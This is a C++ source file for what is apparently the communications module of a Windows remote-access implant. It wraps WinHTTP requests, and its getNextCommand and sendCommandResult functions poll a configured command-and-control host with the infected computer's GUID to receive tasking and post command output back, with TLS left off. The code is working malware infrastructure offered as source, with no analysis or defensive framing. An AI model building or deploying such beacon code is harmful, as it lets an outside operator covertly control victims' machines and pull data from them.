#include <iostream>
#include <string>
#include <windows.h>
#include <winhttp.h>
#include "comms.hpp"

#define BUF_SIZE 4096

std::string makeHttpRequest(LPCWSTR httpVerb, std::string fqdn, int port,
    std::string uri, LPVOID data, bool useTLS) {

    // WinHttp wants wide strings
    std::wstring wfqdn = std::wstring(fqdn.begin(), fqdn.end());
    std::wstring wuri = std::wstring(uri.begin(), uri.end());

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwBytesAvailable = 0, dwBytesRead = 0;
    LPSTR buf;

    std::string result;

    hSession = ::WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) {
        printf("Error getting hSession\n");
    } else {
        hConnect = ::WinHttpConnect(hSession, wfqdn.c_str(), port, 0);
    }

    if (!hConnect) {
        printf("Error %u getting hConnect\n", GetLastError());
    } else {
        if (useTLS) {
            hRequest = ::WinHttpOpenRequest(hConnect, httpVerb, wuri.c_str(),
                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
        } else {
            hRequest = ::WinHttpOpenRequest(hConnect, httpVerb, wuri.c_str(),
                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        }
    }

    if (!hRequest) {
        printf("Error getting hRequest\n");
    } else {
        if (data) { // POST
            // we always post json
            bResults = ::WinHttpSendRequest(hRequest,
                L"Content-Type: application/json", -1L, data,
                strlen((char *)data), strlen((char *)data), 0);
        } else { // GET
            bResults =
                ::WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        }
    }

    if (!bResults) {
        printf("Error with WinHttpSendRequest\n");
    } else {
        bResults = ::WinHttpReceiveResponse(hRequest, NULL);
    }

    if (!bResults) {
        printf("Error with WinHttpReceiveResponse\n");
    }

    buf = (LPSTR)malloc(BUF_SIZE);
    if (!buf) {
        bResults = FALSE;
        printf("Error with malloc\n");
    }

    if (bResults) {
        do {
            dwBytesAvailable = 0;
            if (!::WinHttpQueryDataAvailable(hRequest, &dwBytesAvailable)) {
                printf("Error with WinHttpQueryDataAvailable\n");
                break;
            }
            if (dwBytesAvailable) {
                ZeroMemory(buf, BUF_SIZE);
                if (!::WinHttpReadData(
                        hRequest, buf, BUF_SIZE - 1, &dwBytesRead)) {
                    printf("Error with WinHttpReadData\n");
                    break;
                }
                if (dwBytesRead) {
                    result += buf;
                }
            }
        } while (dwBytesAvailable > 0);
    }

    // cleanup
    if (hSession) {
        ::WinHttpCloseHandle(hSession);
    }
    if (hConnect) {
        ::WinHttpCloseHandle(hConnect);
    }
    if (hRequest) {
        ::WinHttpCloseHandle(hRequest);
    }
    if (buf) {
        free(buf);
    }

    return result;
}

std::string get(std::string fqdn, int port, std::string uri) {
    // do a get request and return the result as a string
    std::string result;
    result =
        makeHttpRequest(L"GET", fqdn, port, uri, NULL, FALSE); // TODO: use TLS?
    return result;
}

std::string post(
    std::string fqdn, int port, std::string uri, std::string data) {
    // do a post request and return the result as a string
    std::string result;
    result = makeHttpRequest(
        L"POST", fqdn, port, uri, (LPVOID)data.c_str(), FALSE); // TODO: use TLS
    return result;
}

std::string getNextCommand(CONFIG config) {
    // get next command from the c2
    std::string commandPath = "/getNextCommand";
    // data is expected as json: {"computer_guid": "7e475579-2a0c-4924-a11d-03a34c56ec95"}
    std::string data = "{\"computer_guid\": \"" + config.computer_guid + "\"}";
    std::string result;
    result = post(config.c2_fqdn, config.c2_port, commandPath, data);
    return result;
}

std::string sendCommandResult(
    CONFIG config, std::string command_id, std::string command_result) {
    std::string commandPath = "/sendCommandResult";
    // data is expected as json
    std::string data = ("{\"computer_guid\": \""+config.computer_guid+"\", "
                         "\"command_id\": \""+command_id+"\", "
                         "\"result\": \""+command_result+"\"}");
    std::string result;
    result = post(config.c2_fqdn, config.c2_port, commandPath, data);
    return result;
}